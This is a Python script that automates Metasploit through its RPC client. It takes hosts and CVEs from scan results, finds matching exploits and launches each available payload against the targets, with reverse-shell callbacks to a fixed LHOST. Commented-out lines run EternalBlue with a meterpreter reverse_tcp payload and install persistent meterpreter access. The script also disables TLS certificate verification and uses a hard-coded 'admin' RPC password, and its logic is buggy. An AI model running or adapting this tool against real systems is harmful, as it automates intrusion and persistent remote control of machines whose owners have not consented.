#!/usr/bin/env python

from metasploit.msfrpc import MsfRpcClient
from metasploit.msfconsole import MsfRpcConsole
import os
import time
import utile
import csv
import ssl

try:
    _create_unverified_https_context = ssl._create_unverified_context
except AttributeError:
    pass
else:
    ssl._create_default_https_context = _create_unverified_https_context

os.system('msfrpcd -P admin -n -a 127.0.0.1')

line_with_positive = []
line_with_exploit = []
line_with_out = []
status_of_console = False

def console_reader(data_in_console):
	status_of_console= data_in_console['busy']
	console_data = data_in_console['data'].rstrip().split('\n')
	for line in console_data:
		if '[+]' in line:
			line_with_positive.append(line)
		elif 'exploit/' in line:
			line_with_exploit.append(line)
		else:
			line_with_out.append(line)	

	print status_of_console

client = MsfRpcClient("admin")
console = MsfRpcConsole(client, cb = console_reader)

utile.parcer_result_scannig("result_of_scannig.csv")

list_cve = []
list_host_exploit = []
list_temp= list()

hitgh_vul = open("high_vul.csv","r")
lines=csv.reader(hitgh_vul)
for line in lines:
 	list_cve=line[1].split()
	line[1] = ""
 	for cve in list_cve:
 		console.execute("search "+str(cve)+"")
 		time.sleep(5)
 		while status_of_console:
 			time.sleep(2)		
	list_temp.append(line[0])
	list_temp.append(str(line_with_exploit).split()[1])
	print list_temp
	line_with_exploit = []
	list_host_exploit.append(list_temp)
	
	list_temp = []
	print list_temp
hitgh_vul.close()
print list_host_exploit

for target in list_host_exploit:
	exploit = client.modules.use("exploit", ""+target[1]+"")
	exploit['VERBOSE'] = True
	exploit['RHOSTS'] = target[0]
	for pay in exploit.payloads: 
		payload =  client.modules.use("payload" ,""+pay+"" )
		if 'LHOST' in payload.required:
			payload['LHOST'] = '192.168.43.61'
		if exploit.execute(payload=payload)['job_id'] != 0:
			print "yes"
			# shell = client.sessions.session(['job_id'])
			# shell.write('run persistence -U -i 5 -p 443 -r 192.168.43.61\n')
			break

# exploit = client.modules.use('exploit', 'windows/smb/ms17_010_eternalblue')
# exploit['RHOSTS'] = "192.168.43.228"
# payload = client.modules.use('payload' , 'windows/x64/meterpreter/reverse_tcp')
# payload['LHOST'] = '192.168.43.61'
# hh = exploit.execute(payload=payload)
# time.sleep(5)
# if hh['job_id']!=0:
# 	shell= client.sessions.session(1)
# 	shell.write('sysinfo\n')
# 	print shell.read()
print client.sessions.list
